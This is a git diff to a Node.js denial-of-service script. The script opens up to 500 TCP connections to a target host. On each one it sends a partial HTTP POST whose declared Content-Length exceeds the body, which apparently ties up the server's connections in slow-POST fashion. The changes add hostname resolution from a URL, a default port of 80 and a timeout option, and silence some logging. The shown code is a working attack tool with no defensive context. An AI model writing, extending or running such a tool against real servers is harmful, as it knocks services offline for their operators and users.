@@ -1,6 +1,7 @@
 #!/usr/bin/env node
 
 const net = require("net");
+const dnsSync = require('dns-sync');
 const argv = require('minimist')(process.argv.slice(2));
 const validIp = require('./util/validations').validIp
 const validPort = require('./util/validations').validPort
@@ -8,10 +9,10 @@ const validPort = require('./util/validations').validPort
 const maxConnections = 500;
 const connections = [];
 
-const host = argv.host || argv.h;
-const port = argv.port || argv.p;
-
-console.log(argv);
+const url = argv.url || argv.u;
+const host = argv.host || argv.h || dnsSync.resolve(url);
+const port = argv.port || argv.p || 80;
+const timeout = argv.timeout || argv.t || 500;
 
 class Connection {
   constructor(h, p) {
@@ -22,7 +23,7 @@ class Connection {
     this.t = Date.now();
 
     this.client = net.connect({ port: p, host: h }, () => {
-      process.stdout.write("Connected, Sending... ");
+      //process.stdout.write("Connected, Sending... ");
 
       this.client.write(
         "POST / HTTP/1.1\r\nHost: " +
@@ -32,7 +33,7 @@ class Connection {
         "Content-Length: 385\r\n\r\nvx=321&d1=fire&l"
       );
 
-      process.stdout.write("Written.\n");
+      //process.stdout.write("Written.\n");
     });
     this.client.on("data", data => {
       console.log("\t-Received " + data.length + " bytes...");
@@ -42,13 +43,13 @@ class Connection {
       const d = Date.now() - this.t;
       this.state = "ended";
 
-      console.log(
+      /* console.log(
         "\t-Disconnected (duration: " +
         (d / 1000).toFixed(3) +
         " seconds, remaining open: " +
         connections.length +
         ")."
-      );
+      ); */
     });
     this.client.on("error", () => {
       this.state = "error";
